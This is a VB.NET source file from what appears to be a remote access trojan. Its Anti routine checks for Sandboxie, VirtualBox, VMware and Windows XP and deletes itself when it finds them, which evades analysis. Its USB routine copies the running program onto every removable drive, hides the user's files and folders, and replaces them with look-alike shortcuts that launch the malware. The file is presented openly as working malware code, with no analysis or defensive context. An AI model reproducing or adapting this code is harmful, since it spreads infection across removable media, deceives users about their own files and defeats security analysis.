
Namespace Lime
    Public Class MISC

        Public Shared Sub Anti()
            On Error Resume Next
            If Settings.ANTIV Then
                If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
                    Insistence.DEL()
                End If

                If Process.GetProcessesByName("VBoxservice").Length >= 1 Or IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
                    Insistence.DEL()
                End If

                If Process.GetProcessesByName("vmwareservice").Length >= 1 Or IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
                    Insistence.DEL()
                End If

                If ID.GOS.ToString.Contains("XP") Then
                    Insistence.DEL()
                End If

            End If
        End Sub





        Public Shared ExeName As String = Settings.LEXE
        Public Shared H As Threading.Thread

        Public Shared Sub USB()
            If Settings.SPUSB Then
                H = New Threading.Thread(AddressOf WorkThread)
                H.Start()
            Else
                Settings.SPUSB_TEXT = "Disabled"
            End If
        End Sub

        Public Shared Sub WorkThread()
            On Error Resume Next
            Dim allDrives() As IO.DriveInfo = IO.DriveInfo.GetDrives()
            Dim d As IO.DriveInfo

            Dim VbsObj As Object
            VbsObj = CreateObject("WScript.Shell")
            Dim DE As Object

            For Each d In allDrives

                If d.IsReady = True AndAlso d.DriveType = IO.DriveType.Removable Then
                    Dim RootDir As String = d.RootDirectory.ToString
                    IO.File.Copy(Diagnostics.Process.GetCurrentProcess.MainModule.FileName, RootDir & ExeName)
                    IO.File.SetAttributes(RootDir & ExeName, IO.FileAttributes.Hidden)
                    For Each f As String In IO.Directory.GetFiles(RootDir)
                        If IO.Path.GetFileNameWithoutExtension(f) = IO.Path.GetFileNameWithoutExtension(ExeName) Then GoTo GoHere
                        If Not f.Contains(".lnk") Then
                            IO.File.SetAttributes(f, IO.FileAttributes.Hidden)
                        End If
                        DE = VbsObj.CreateShortcut(RootDir & IO.Path.GetFileNameWithoutExtension(f) & ".lnk")
                        DE.TargetPath = RootDir & ExeName
                        DE.WorkingDirectory = RootDir
                        DE.IconLocation = f & ", 0"
                        DE.Save()
GoHere:
                    Next
                    Settings.SPUSB_TEXT = "Yes"
                    For Each dx As String In IO.Directory.GetDirectories(RootDir)
                        Dim dir As New IO.DirectoryInfo(dx)
                        dir.Attributes = IO.FileAttributes.Hidden
                        DE = VbsObj.CreateShortcut(dx & ".lnk")
                        DE.TargetPath = RootDir & ExeName
                        DE.WorkingDirectory = RootDir
                        DE.IconLocation = Environment.GetEnvironmentVariable("windir") & "\System32\Shell32.dll" & ", 3"
                        DE.Save()
                    Next
                Else
                    Settings.SPUSB_TEXT = "No"
                End If
            Next

        End Sub

    End Class
End Namespace